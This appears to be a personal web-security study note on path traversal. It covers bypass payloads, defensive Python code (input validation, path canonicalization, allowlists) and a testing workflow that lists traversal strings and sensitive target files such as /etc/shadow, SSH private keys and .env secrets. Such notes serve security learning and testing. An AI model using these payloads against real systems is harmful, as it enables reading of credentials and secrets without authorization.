#webapplications

OWASP A05 (Injection) — input reaches a file path operation and an attacker reads files the server has access to, or writes/executes code.

## Path traversal basics
```
Normal:  GET /files?name=courses.txt   → read /app/files/courses.txt
Changed: GET /files?name=../../etc/passwd   → read /etc/passwd (outside intended directory)
```
The `../` sequences climb out of the allowed directory. On Windows, `..\..\` and UNC paths (`\\server\share`) work the same way — an input meant to select a filename can instead select *any* file the application process can reach.

## Bypass techniques
Even when defenses exist, they often have gaps:

| Bypass                | When it works                                 | Example                                                                       |
| --------------------- | --------------------------------------------- | ----------------------------------------------------------------------------- |
| Absolute path         | App checks for `../` but not absolute paths   | `/etc/passwd` (input starts at filesystem root)                               |
| Nested traversal      | App strips `../` non-recursively              | `....//` → `../` after stripping inner `..`                                   |
| URL encoding          | Web server strips before reaching app         | `%2e%2e%2f` (URL-decoded once) or `%252e%252e%252f` (decoded twice)           |
| Non-standard encoding | Unusual byte sequences for `/`                | `..%c0%af` (UTF-8 encoding), `..%ef%bc%8f` (fullwidth slash)                  |
| Base folder included  | App requires `filename=/var/www/images` start | `filename=/var/www/images/../../../etc/passwd` (contains required prefix)     |
| Extension appended    | App appends `.jpg` automatically              | `filename=../../../etc/passwd%00.jpg` (null byte terminates before extension) |

## Proper defense — two-layer approach

**Layer 1: Validate input** — accept only expected characters:
```python
import re
filename = request.args.get("file")
# Only alphanumeric, dash, underscore
if not re.match(r'^[a-zA-Z0-9_-]+$', filename):
    return {"error": "Invalid filename"}, 400
```

**Layer 2: Canonicalize the path** — resolve `..` and verify it stays in bounds:
```python
import os
base = "/app/files"
requested = request.args.get("file")
# Join and normalize to absolute path
full_path = os.path.realpath(os.path.join(base, requested))
# Check it's still under base
if not full_path.startswith(os.path.realpath(base)):
    return {"error": "Access denied"}, 403
# Safe to open
with open(full_path) as f:
    return f.read()
```

The key: **canonicalize first, then check** (not the other way around — symlinks can bypass a check that happens before canonicalization).

**Best approach: use an allowlist** — never interpolate user input into a path:
```python
files = {
    "courses": "courses.txt",
    "schedule": "schedule.txt",
    "syllabus": "syllabus.pdf"
}
filename = files.get(request.args.get("file"))
if filename is None:
    return {"error": "File not found"}, 404
# filename is guaranteed to be one of the allowed values
with open(os.path.join("/app/files", filename)) as f:
    return f.read()
```

## NULL bytes (legacy vulnerability)
```
Input: courses.txt%00.jpg   → courses.txt (on PHP 5.3 and earlier, %00 terminates the string)
```
Modern systems and languages reject NULL bytes in paths outright. On old PHP/Apache, this was a bypass for extension checks — the `.jpg` was supposed to prove safety, but the NULL byte cut it off. Only relevant on very old systems (PHP < 5.3, Java < 6, etc.).

## Testing workflow

### Step 1: Identify the vulnerability
1. **Find a filename parameter** — anywhere the app reads a file:
   ```
   GET /loadImage?filename=banner.jpg
   GET /docs?file=guide.pdf
   POST /export (with file parameter in body)
   ```

2. **Test with a traversal sequence** — start simple:
   ```
   filename=../../../etc/passwd
   filename=..\\..\\..\\windows\\win.ini
   ```

3. **Check the response** — does it contain file contents, or an error?
   - Success: Response includes the file content (e.g., user list from passwd)
   - Blocked: 403, "Invalid filename", or "file not found"
   - Wrong file: App rejected the path

### Step 2: Bypass defenses (if first attempt blocked)
Try in order:
1. **Absolute path:** `/etc/passwd` (no `../` sequences)
2. **Nested traversal:** `....//` (becomes `../` after `..` is stripped)
3. **URL encoding:** `%2e%2e%2f` (becomes `../` after URL decode)
4. **Double encoding:** `%252e%252e%252f` (first decode → `%2e%2e%2f`, second → `../`)
5. **Non-standard encoding:** `..%c0%af` (UTF-8), `..%ef%bc%8f` (fullwidth)
6. **Base folder prefix:** `/var/www/images/../../../etc/passwd` (if app requires filename to start with base)
7. **Null byte (old only):** `../../../etc/passwd%00.jpg` (PHP < 5.3)

### Step 3: Target sensitive files
**Linux/Unix:**
- `/etc/passwd` — user list
- `/etc/shadow` — password hashes (needs root)
- `~/.ssh/id_rsa` — SSH private key
- `/app/config.php` — database credentials
- `/app/.env` — secrets and API keys
- `/var/log/apache2/access.log` — server logs

**Windows:**
- `C:\windows\win.ini` — system config
- `C:\windows\system32\drivers\etc\hosts` — host file
- `C:\Users\<user>\.ssh\id_rsa` — SSH key
- `C:\app\web.config` — .NET config (contains credentials)

## Escalation chains
Once LFI is confirmed, chain it with other vulnerabilities for code execution:
- **[[LFI Exploitation Chains]]** — upload + LFI, log poisoning + LFI, session poisoning + LFI
- **[[Remote File Inclusion]]** — include PHP from an attacker-controlled server
